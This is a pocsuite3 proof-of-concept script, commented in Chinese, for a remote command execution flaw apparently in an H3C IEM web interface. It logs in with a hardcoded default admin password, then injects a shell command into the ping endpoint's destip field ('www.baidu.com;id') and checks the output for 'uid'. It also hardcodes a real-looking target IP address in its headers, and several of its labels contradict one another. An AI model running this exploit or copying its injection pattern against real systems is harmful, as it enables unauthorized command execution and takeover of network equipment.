from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
requests.packages.urllib3.disable_warnings()

# 关于类的继承
class H3c_Iem(POCBase):
    # fofa语句: title="vRealize Operations Manager"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "Pontusec"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = [""]  # 漏洞地址来源,0day不用写
    name = "远程命令执行 PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "rce "  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION # XML实体注入 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """youyou"""  # 漏洞简要描述
    pocDesc = """pocsuite -r pocs/xx.py -u http://example --verify"""  # POC用法描述

    def _check(self):
        result = []
        session = requests.session()
        # 漏洞验证代码
        url1 = f"{self.url.strip()}/index.php?c=user&a=ajax_save"
        headers = {"Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\"",
                         "Accept": "application/json, text/javascript, */*; q=0.01",
                         "X-Requested-With": "XMLHttpRequest",
                         "Sec-Ch-Ua-Mobile": "?0",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
                         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                         "Origin": "https://183.62.71.229:888", "Sec-Fetch-Site": "same-origin",
                         "Sec-Fetch-Mode": "cors",
                         "Sec-Fetch-Dest": "empty", "Referer": "https://183.62.71.229:888/index.php",
                         "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        payload = {"username": "admin", "password": "hicomadmin", "language": "zh-cn"}
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url1 = self.url.strip() + "/index.php?c=user&a=ajax_save"  # self.url 就是你指定的-u 参数的值
            res1 = session.post(url1, headers=headers, data=payload, verify=False)
            data_dict1 = res1.json()
            url2 = self.url.strip() + "/index.php?c=maintain&a=ping"
            payload2 = {"interface": '', "destip": "www.baidu.com;id"}
            res2 = session.post(url2, headers=headers, data=payload2, verify=False)
            # 判断是否存在漏洞
            if 'uid' in res2.text:
                result.append(self.url)
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            # 这些信息会在终端上显示
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        # return self._verify()
        pass

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(H3c_Iem)
